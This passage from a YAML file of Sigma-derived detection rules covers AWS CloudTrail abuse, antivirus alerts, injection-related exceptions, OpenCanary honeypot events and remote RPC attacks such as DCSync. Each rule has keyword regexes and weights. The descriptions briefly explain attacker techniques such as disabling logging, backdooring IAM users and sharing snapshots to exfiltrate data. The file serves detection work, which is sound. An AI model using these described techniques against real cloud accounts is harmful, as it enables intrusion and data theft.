    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07330162_dba1_4746_8121_a9647d49d297
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects AWS Config Service disabling
  conditions:
    summary:
      regex_any:
      - config
      - disabling
      - channel
      - recorder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8103686_e3e8_46f3_be72_65f7fcb4aa53
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects potentially suspicious events involving "GetSigninToken".

    An adversary using the "aws_consoler" tool can leverage this console API to create
    temporary federated credential that help obfuscate which AWS credential is compromised
    (the original access key) and enables the adversary to pivot from the AWS CLI
    to console sessions without the need for MFA using the new access key issued in
    this request.

    '
  conditions:
    summary:
      regex_any:
      - console
      - getsignintoken
      - potential
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_20f754db_d025_4a8f_9d74_e0037e999a9a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an instance of an SES identity being deleted via the "DeleteIdentity"
    event. This may be an indicator of an adversary removing the account that carried
    out suspicious or malicious activities
  conditions:
    summary:
      regex_any:
      - identity
      - been
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ccd6a6c8_bb4e_4a91_9d2a_07e632819374
  intent: impact_operations
  tactic: impact
  description: 'Detects the deletion of an AWS SAML provider, potentially indicating
    malicious intent to disrupt administrative or security team access.

    An attacker can remove the SAML provider for the information security team or
    a team of system administrators, to make it difficult for them to work and investigate
    at the time of the attack and after it.

    '
  conditions:
    summary:
      regex_any:
      - saml
      - provider
      - deletion
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a136ac98_b2bc_4189_a14d_f0d0388e57a7
  intent: impact_operations
  tactic: impact
  description: Detects when S3 bucket versioning is disabled. Threat actors use this
    technique during AWS ransomware incidents prior to deleting S3 objects.
  conditions:
    summary:
      regex_any:
      - bucket
      - versioning
      - disable
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16124c2d_e40b_4fcc_8f2c_5ab7870a2223
  intent: impact_operations
  tactic: impact
  description: 'Identifies disabling of default Amazon Elastic Block Store (EBS) encryption
    in the current region.

    Disabling default encryption does not change the encryption status of your existing
    volumes.

    '
  conditions:
    summary:
      regex_any:
      - disable
      - encryption
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_92f84194_8d9a_4ee0_8699_c30bfac59780
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects the import of SSH key pairs into AWS EC2, which may indicate
    an attacker attempting to gain unauthorized access to instances. This activity
    could lead to initial access, persistence, or privilege escalation, potentially
    compromising sensitive data and operations.

    '
  conditions:
    summary:
      regex_any:
      - pair
      - import
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1ab3c5ed_5baf_417b_bb6b_78ca33f6c3df
  intent: execution
  tactic: execution
  description: Detects changes to the EC2 instance startup script. The shell script
    will be executed as root/SYSTEM every time the specific instances are booted up.
  conditions:
    summary:
      regex_any:
      - startup
      - shell
      - script
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b94bf91e_c2bf_4047_9c43_c6810f43baad
  intent: persistence_installation
  tactic: persistence
  description: 'Detects when an Elastic Container Service (ECS) Task Definition includes
    a command to query the credential endpoint.

    This can indicate a potential adversary adding a backdoor to establish persistence
    or escalate privileges.

    '
  conditions:
    summary:
      regex_any:
      - task
      - definition
      - that
      - queries
      - credential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_25cb1ba1_8a19_4a23_a198_d252664c8cef
  intent: impact_operations
  tactic: impact
  description: 'Detects when a EFS Fileshare is modified or deleted.

    You can''t delete a file system that is in use.

    If the file system has any mount targets, the adversary must first delete them,
    so deletion of a mount will occur before deletion of a fileshare.

    '
  conditions:
    summary:
      regex_any:
      - fileshare
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6a7ba45c_63d8_473e_9736_2eaabff79964
  intent: impact_operations
  tactic: impact
  description: Detects when a EFS Fileshare Mount is modified or deleted. An adversary
    breaking any file system using the mount target that is being deleted, which might
    disrupt instances or applications using those mounts.
  conditions:
    summary:
      regex_any:
      - fileshare
      - mount
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e61ee20_ce00_4f8d_8aee_bedd8216f7e3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects updates of the GuardDuty list of trusted IPs, perhaps to disable
    security alerts against malicious IPs.
  conditions:
    summary:
      regex_any:
      - guardduty
      - important
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0a5177f4_6ca9_44c2_aacf_d3f3d8b6e4d2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects AWS API key creation for a user by another user.

    Backdoored users can be used to obtain persistence in the AWS environment.

    Also with this alert, you can detect a flow of AWS keys in your org.

    '
  conditions:
    summary:
      regex_any:
      - backdoor
      - users
      - keys
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db014773_b1d3_46bd_ba26_133337c0ffee
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects S3 Browser utility performing reconnaissance looking for existing
    IAM Users without a LoginProfile defined then (when found) creating a LoginProfile.
  conditions:
    summary:
      regex_any:
      - s3browser
      - loginprofile
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db014773_7375_4f4e_b83b_133337c0ffee
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects S3 browser utility creating Inline IAM policy containing default
    S3 bucket name placeholder value of "<YOUR-BUCKET-NAME>".
  conditions:
    summary:
      regex_any:
      - s3browser
      - templated
      - bucket
      - policy
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db014773_d9d9_4792_91e5_133337c0ffee
  intent: unknown
  tactic: initial_access
  description: Detects S3 Browser utility creating IAM User or AccessKey.
  conditions:
    summary:
      regex_any:
      - s3browser
      - user
      - accesskey
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1279262f_1464_422f_ac0d_5b545320c526
  intent: unknown
  tactic: resource_development
  description: 'Detects the import or deletion of key material in AWS KMS, which can
    be used as part of ransomware attacks. This activity is uncommon and provides
    a high certainty signal.

    '
  conditions:
    summary:
      regex_any:
      - imported
      - material
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec541962_c05a_4420_b9ea_84de072d18f4
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects when a user creates a Lambda function URL configuration, which
    could be used to expose the function to the internet and potentially allow unauthorized
    access to the function''s IAM role for AWS API calls.

    This could give an adversary access to the privileges associated with the Lambda
    service role that is attached to that function.

    '
  conditions:
    summary:
      regex_any:
      - lambda
      - function
      - configuration
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8a63cdd4_6207_414a_85bc_7e032bd3c1a2
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects the change of database master password. It may be a part of
    data exfiltration.
  conditions:
    summary:
      regex_any:
      - master
      - password
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_457cc9ac_d8e6_4d1d_8c0e_251d0f11a74c
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects modifications to an RDS cluster or its deletion, which may
    indicate potential data exfiltration attempts, unauthorized access, or exposure
    of sensitive information.
  conditions:
    summary:
      regex_any:
      - modification
      - deletion
      - cluster
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c3f265c7_ff03_4056_8ab2_d486227b4599
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects the recovery of a new public database instance from a snapshot.
    It may be a part of data exfiltration.
  conditions:
    summary:
      regex_any:
      - restore
      - public
      - instance
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8ad1600d_e9dc_4251_b0ee_a65268f29add
  intent: persistence_installation
  tactic: persistence
  description: Detects AWS root account usage
  conditions:
    summary:
      regex_any:
      - root
      - credentials
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a607e1fe_74bf_4440_a3ec_b059b9103157
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the modification of the findings on SecurityHub.
  conditions:
    summary:
      regex_any:
      - securityhub
      - findings
      - evasion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_abae8fec_57bd_4f87_aff6_6e3db989843d
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects the modification of an EC2 snapshot's permissions to enable
    access from another account
  conditions:
    summary:
      regex_any:
      - snapshot
      - backup
      - exfiltration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d3adb3ef_b7e7_4003_9092_1924c797db35
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a change in the AWS Identity Center (FKA AWS SSO) identity
    provider.

    A change in identity provider allows an attacker to establish persistent access
    or escalate privileges via user impersonation.

    '
  conditions:
    summary:
      regex_any:
      - identity
      - center
      - identity
      - provider
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9b1b8e9b_0a5d_4af1_9d2f_4c4b6e7c2c9d
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the use of TruffleHog for AWS credential validation by identifying
    GetCallerIdentity API calls where the userAgent indicates TruffleHog.

    Threat actors leverage TruffleHog to enumerate and validate exposed AWS keys.

    Successful exploitation allows threat actors to confirm the validity of compromised
    AWS credentials, facilitating further unauthorized access and actions within the
    AWS environment.

    '
  conditions:
    summary:
      regex_any:
      - getcalleridentity
      - enumeration
      - trufflehog
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f43f5d2f_3f2a_4cc8_b1af_81fde7dbaf0e
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies when suspicious SAML activity has occurred in AWS. An adversary
    could gain backdoor access via SAML.
  conditions:
    summary:
      regex_any:
      - suspicious
      - saml
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_055fb148_60f8_462d_ad16_26926ce050f1
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects activity when someone is changing passwords on behalf of other
    users.

    An attacker with the "iam:UpdateLoginProfile" permission on other users can change
    the password used to login to the AWS console on any user that already has a login
    profile setup.

    '
  conditions:
    summary:
      regex_any:
      - user
      - login
      - profile
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_238527ad_3c2c_4e4f_a1f6_92fd63adb864
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a highly relevant Antivirus alert that reports an exploitation
    framework.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  conditions:
    summary:
      regex_any:
      - antivirus
      - exploitation
      - framework
      - detection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa0c05b6_8ad3_468d_8231_c1cbccb64fba
  intent: execution
  tactic: execution
  description: 'Detects a highly relevant Antivirus alert that reports a hack tool
    or other attack tool.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  conditions:
    summary:
      regex_any:
      - antivirus
      - hacktool
      - detection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_78cc2dd2_7d20_4d32_93ff_057084c38b93
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects a highly relevant Antivirus alert that reports a password
    dumper.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  conditions:
    summary:
      regex_any:
      - antivirus
      - password
      - dumper
      - detection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4c6ca276_d4d0_4a8c_9e4c_d69832f8671f
  intent: impact_operations
  tactic: impact
  description: 'Detects a highly relevant Antivirus alert that reports ransomware.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  conditions:
    summary:
      regex_any:
      - antivirus
      - ransomware
      - detection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c9a88268_0047_4824_ba6e_4d81ce0b907c
  intent: unknown
  tactic: resource_development
  description: 'Detects an Antivirus alert in a highly relevant file path or with
    a relevant file name.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  conditions:
    summary:
      regex_any:
      - antivirus
      - relevant
      - file
      - paths
      - alerts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fdf135a2_9241_4f96_a114_bb404948f736
  intent: persistence_installation
  tactic: persistence
  description: 'Detects a highly relevant Antivirus alert that reports a web shell.

    It''s highly recommended to tune this rule to the specific strings used by your
    anti virus solution by downloading a big WebShell repository from e.g. github
    and checking the matches.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  conditions:
    summary:
      regex_any:
      - antivirus
      - shell
      - detection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d84c0ded_edd7_4123_80ed_348bb3ccc4d5
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious SQL query keywrods that are often used during recon,
    exfiltration or destructive activities. Such as dropping tables and selecting
    wildcard fields
  conditions:
    summary:
      regex_any:
      - suspicious
      - query
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fd435618_981e_4a7c_81f8_f78ce480d616
  intent: unknown
  tactic: initial_access
  description: Detects suspicious Django web application framework exceptions that
    could indicate exploitation attempts
  conditions:
    summary:
      regex_any:
      - django
      - framework
      - exceptions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bb0e9cec_d4da_46f5_997f_22efc59f3dca
  intent: unknown
  tactic: initial_access
  description: Detects potential JNDI Injection exploitation. Often coupled with Log4Shell
    exploitation.
  conditions:
    summary:
      regex_any:
      - potential
      - jndi
      - injection
      - exploitation
      - based
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e032f5bc_4563_4096_ae3b_064bab588685
  intent: unknown
  tactic: initial_access
  description: 'Detects potential local file read vulnerability in JVM based apps.

    If the exceptions are caused due to user input and contain path traversal payloads
    then it''s a red flag.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - local
      - file
      - read
      - vulnerability
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4d0af518_828e_4a04_a751_a7d03f3046ad
  intent: unknown
  tactic: initial_access
  description: 'Detects potential OGNL Injection exploitation, which may lead to RCE.

    OGNL is an expression language that is supported in many JVM based systems.

    OGNL Injection is the reason for some high profile RCE''s such as Apache Struts
    (CVE-2017-5638) and Confluence (CVE-2022-26134)

    '
  conditions:
    summary:
      regex_any:
      - potential
      - ognl
      - injection
      - exploitation
      - based
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d65f37da_a26a_48f8_8159_3dde96680ad2
  intent: unknown
  tactic: initial_access
  description: Detects process execution related exceptions in JVM based apps, often
    relates to RCE
  conditions:
    summary:
      regex_any:
      - process
      - execution
      - error
      - based
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c4e06896_e27c_4583_95ac_91ce2279345d
  intent: unknown
  tactic: initial_access
  description: Detects XML parsing issues, if the application expects to work with
    XML make sure that the parser is initialized safely.
  conditions:
    summary:
      regex_any:
      - potential
      - exploitation
      - attempt
      - based
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_97661d9d_2beb_4630_b423_68985291a8af
  intent: unknown
  tactic: initial_access
  description: Detects process execution related errors in NodeJS. If the exceptions
    are caused due to user input then they may suggest an RCE vulnerability.
  conditions:
    summary:
      regex_any:
      - potential
      - exploitation
      - attempt
      - nodejs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6991bc2b_ae2e_447f_bc55_3a1ba04c14e5
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects instances where an FTP service on an OpenCanary node has had
    a login attempt.
  conditions:
    summary:
      regex_any:
      - opencanary
      - login
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4fe17521_aef3_4e6a_9d6b_4a7c8de155a8
  intent: data_staging
  tactic: collection
  description: Detects instances where a GIT service on an OpenCanary node has had
    Git Clone request.
  conditions:
    summary:
      regex_any:
      - opencanary
      - clone
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5498fc09_adc6_4804_b9d9_5cca1f0b8760
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects instances where an HTTPPROXY service on an OpenCanary node
    has had an attempt to proxy another page.

    '
  conditions:
    summary:
      regex_any:
      - opencanary
      - httpproxy
      - login
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_af6c3078_84cd_4c68_8842_08b76bd81b13
  intent: unknown
  tactic: initial_access
  description: Detects instances where an HTTP service on an OpenCanary node has received
    a GET request.
  conditions:
    summary:
      regex_any:
      - opencanary
      - http
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_af1ac430_df6b_4b38_b976_0b52f07a0252
  intent: unknown
  tactic: initial_access
  description: 'Detects instances where an HTTP service on an OpenCanary node has
    had login attempt via Form POST.

    '
  conditions:
    summary:
      regex_any:
      - opencanary
      - http
      - post
      - login
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3ec9a16d_0b4f_4967_9542_ebf38ceac7dd
  intent: data_staging
  tactic: collection
  description: 'Detects instances where an MSSQL service on an OpenCanary node has
    had a login attempt using SQLAuth.

    '
  conditions:
    summary:
      regex_any:
      - opencanary
      - mssql
      - login
      - attempt
      - sqlauth
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e78f90f_0043_4a01_ac41_f97681613a66
  intent: data_staging
  tactic: collection
  description: 'Detects instances where an MSSQL service on an OpenCanary node has
    had a login attempt using Windows Authentication.

    '
  conditions:
    summary:
      regex_any:
      - opencanary
      - mssql
      - login
      - attempt
      - windows
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e7d79a1b_25ed_4956_bd56_bd344fa8fd06
  intent: data_staging
  tactic: collection
  description: Detects instances where a MySQL service on an OpenCanary node has had
    a login attempt.
  conditions:
    summary:
      regex_any:
      - opencanary
      - mysql
      - login
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7cded4b3_f09e_405a_b96f_24248433ba44
  intent: impact_operations
  tactic: impact
  description: Detects instances where an NTP service on an OpenCanary node has had
    a NTP monlist request.
  conditions:
    summary:
      regex_any:
      - opencanary
      - monlist
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_547dfc53_ebf6_4afe_8d2e_793d9574975d
  intent: data_staging
  tactic: collection
  description: Detects instances where a REDIS service on an OpenCanary node has had
    an action command attempted.
  conditions:
    summary:
      regex_any:
      - opencanary
      - redis
      - action
      - command
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e30de276_68ec_435c_ab99_ef3befec6c61
  intent: data_staging
  tactic: collection
  description: Detects instances where an SIP service on an OpenCanary node has had
    a SIP request.
  conditions:
    summary:
      regex_any:
      - opencanary
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_22777c9e_873a_4b49_855f_6072ab861a52
  intent: data_staging
  tactic: collection
  description: Detects instances where an SMB service on an OpenCanary node has had
    a file open request.
  conditions:
    summary:
      regex_any:
      - opencanary
      - file
      - open
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9856028_fd4e_46e6_b3d1_10f7ceb95078
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects instances where an SNMP service on an OpenCanary node has had
    an OID request.
  conditions:
    summary:
      regex_any:
      - opencanary
      - snmp
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff7139bc_fdb1_4437_92f2_6afefe8884cb
  intent: persistence_installation
  tactic: persistence
  description: Detects instances where an SSH service on an OpenCanary node has had
    a login attempt.
  conditions:
    summary:
      regex_any:
      - opencanary
      - login
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd55f721_5623_4663_bd9b_5229cab5237d
  intent: persistence_installation
  tactic: persistence
  description: Detects instances where an SSH service on an OpenCanary node has had
    a connection attempt.
  conditions:
    summary:
      regex_any:
      - opencanary
      - connection
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_512cff7a_683a_43ad_afe0_dd398e872f36
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects instances where a Telnet service on an OpenCanary node has
    had a login attempt.
  conditions:
    summary:
      regex_any:
      - opencanary
      - telnet
      - login
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b4e6b016_a2ac_4759_ad85_8000b300d61e
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects instances where a TFTP service on an OpenCanary node has had
    a request.
  conditions:
    summary:
      regex_any:
      - opencanary
      - tftp
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9db5446c_b44a_4291_8b89_fcab5609c3b3
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects instances where a VNC service on an OpenCanary node has had
    a connection attempt.
  conditions:
    summary:
      regex_any:
      - opencanary
      - connection
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_19aefed0_ffd4_47dc_a7fc_f8b1425e84f9
  intent: unknown
  tactic: initial_access
  description: Generic rule for SQL exceptions in Python according to PEP 249
  conditions:
    summary:
      regex_any:
      - python
      - exceptions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0fcd1c79_4eeb_4746_aba9_1b458f7a79cb
  intent: persistence_installation
  tactic: persistence
  description: Detects remote RPC calls to create or execute a scheduled task via
    ATSvc
  conditions:
    summary:
      regex_any:
      - remote
      - schedule
      - task
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f177f2bc_5f3e_4453_b599_57eefce9a59c
  intent: reconnaissance
  tactic: discovery
  description: Detects remote RPC calls to read information about scheduled tasks
    via AtScv
  conditions:
    summary:
      regex_any:
      - remote
      - schedule
      - task
      - recon
      - atscv
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_56fda488_113e_4ce9_8076_afc2457922c3
  intent: reconnaissance
  tactic: discovery
  description: Detects remote RPC calls to MS-DRSR from non DC hosts, which could
    indicate DCSync / DCShadow attacks.
  conditions:
    summary:
      regex_any:
      - possible
      - dcsync
      - attack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f92fff9_82e2_48eb_8fc1_8b133556a551
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects remote RPC calls to possibly abuse remote encryption service
    via MS-EFSR
  conditions:
    summary:
      regex_any:
      - remote
      - encrypting
      - file
      - system
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2053961f_44c7_4a64_b62d_f6e72800af0d
  intent: reconnaissance
  tactic: discovery
  description: Detects remote RPC calls to get event log information via EVEN or EVEN6
  conditions:
    summary:
      regex_any:
      - remote
      - event
      - recon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ace3ff54_e7fd_46bd_8ea0_74b49a0aca1d
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects remote RPC calls to create or execute a scheduled task
  conditions:
    summary:
      regex_any:
      - remote
      - schedule
      - task
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7f7c49eb_2977_4ac8_8ab0_ab1bae14730e
  intent: reconnaissance
  tactic: discovery
  description: Detects remote RPC calls to read information about scheduled tasks
  conditions:
    summary:
      regex_any:
      - remote
      - schedule
      - task
      - recon
      - itaskschedulerservice
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bc3a4b0c_e167_48e1_aa88_b3020950e560
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects remote RPC calls to possibly abuse remote printing service
    via MS-RPRN / MS-PAR
  conditions:
    summary:
      regex_any:
      - remote
      - printing
      - abuse
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_68050b10_e477_4377_a99b_3721b422d6ef
  intent: execution
  tactic: execution
  description: Detects remote RPC calls that performs remote DCOM operations. These
    could be abused for lateral movement via DCOM or WMI.
  conditions:
    summary:
      regex_any:
      - remote
      - dcom
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_35c55673_84ca_4e99_8d09_e334f3c29539
  intent: persistence_installation
  tactic: persistence
  description: Detects remote RPC calls to modify the registry and possible execute
    code
  conditions:
    summary:
      regex_any:
      - remote
      - registry
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d8ffe17e_04be_4886_beb9_c1dd1944b9a8
  intent: reconnaissance
  tactic: discovery
  description: Detects remote RPC calls to collect information
  conditions:
    summary:
      regex_any:
      - remote
      - registry
      - recon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6ea3cc7_542f_43ef_bbe4_980fbed444c7
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects remote RPC calls to possibly abuse remote encryption service
    via MS-SRVS
  conditions:
    summary:
      regex_any:
      - remote
      - server
      - service
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_10018e73_06ec_46ec_8107_9172f1e04ff2
  intent: execution
  tactic: execution
  description: Detects remote RPC calls to possibly abuse remote encryption service
    via MS-EFSR
  conditions:
    summary:
      regex_any:
      - remote
      - server
      - service
      - abuse
      - lateral
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aff229ab_f8cd_447b_b215_084d11e79eb0
  intent: persistence_installation
  tactic: persistence
  description: Detects remote RPC calls to create or execute a scheduled task via
    SASec
  conditions:
    summary:
      regex_any:
      - remote
      - schedule
      - task
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0a3ff354_93fc_4273_8a03_1078782de5b7
  intent: reconnaissance
  tactic: discovery
  description: Detects remote RPC calls to read information about scheduled tasks
    via SASec
  conditions:
    summary:
      regex_any:
      - recon
      - activity
      - sasec
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_65f77b1e_8e79_45bf_bb67_5988a8ce45a5
  intent: reconnaissance
  tactic: discovery
  description: Detects remote RPC calls useb by SharpHound to map remote connections
    and local group membership.
  conditions:
    summary:
      regex_any:
      - sharphound
      - recon
      - account
      - discovery
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6d580420_ff3f_4e0e_b6b0_41b90c787e28
  intent: reconnaissance
  tactic: discovery
  description: Detects remote RPC calls useb by SharpHound to map remote connections
    and local group membership.
  conditions:
    summary:
      regex_any:
      - sharphound
      - recon
      - sessions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0d2c3d4c_4b48_4ac3_8f23_ea845746bb1a
  intent: unknown
  tactic: initial_access
  description: Detects suspicious Ruby on Rails exceptions that could indicate exploitation
    attempts
  conditions:
    summary:
      regex_any:
      - ruby
      - rails
      - framework
      - exceptions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae48ab93_45f7_4051_9dfe_5d30a3f78e33
  intent: unknown
  tactic: initial_access
  description: Detects suspicious Spring framework exceptions that could indicate
    exploitation attempts
  conditions:
    summary:
      regex_any:
      - spring
      - framework
      - exceptions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9edd087_89d8_48c9_b0b4_5b9bb10896b8
  intent: unknown
  tactic: initial_access
  description: Detects potential SpEL Injection exploitation, which may lead to RCE.
  conditions:
    summary:
      regex_any:
      - potential
      - spel
      - injection
      - spring
      - framework
  weights:
